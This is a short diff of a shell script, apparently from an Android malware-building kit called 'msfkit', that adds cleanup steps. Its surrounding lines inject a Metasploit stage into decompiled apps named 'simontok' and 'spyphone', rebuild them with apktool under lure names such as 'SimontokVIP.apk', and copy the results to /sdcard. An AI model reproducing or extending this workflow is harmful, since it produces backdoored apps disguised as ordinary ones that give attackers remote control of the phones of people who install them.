@@ -742,7 +742,8 @@ cd msfkit/Malware && rm -fr simontok/smali/com/metasploit/stage
 mv -f payload/smali/com/metasploit/stage simontok/smali/com/metasploit/stage && cd
 cd msfkit/Malware && apktool b simontok -o SimontokVIP.apk && cd
 cd msfkit/Malware && mv -f SimontokVIP.apk /sdcard && cd
-cd msfkit/Malware && rm -fr *
+cd msfkit/Malware && rm -fr * && cd
+cd msfkit && rm -fr Payload
 echo $hi
 echo "selesai"
 echo "----------------------------------------------------"
@@ -779,7 +780,8 @@ cd msfkit/Malware && rm -fr spyphone/smali/com/metasploit/stage
 mv -f payload/smali/com/metasploit/stage spyphone/smali/com/metasploit/stage && cd
 cd msfkit/Malware && apktool b spyphone -o spyphone.apk && cd
 cd msfkit/Malware && mv -f spyphone.apk /sdcard && cd
-cd msfkit/Malware && rm -fr *
+cd msfkit/Malware && rm -fr * && cd
+cd msfkit && rm -fr Payload
 echo $hi
 echo "selesai"
 echo "----------------------------------------------------"
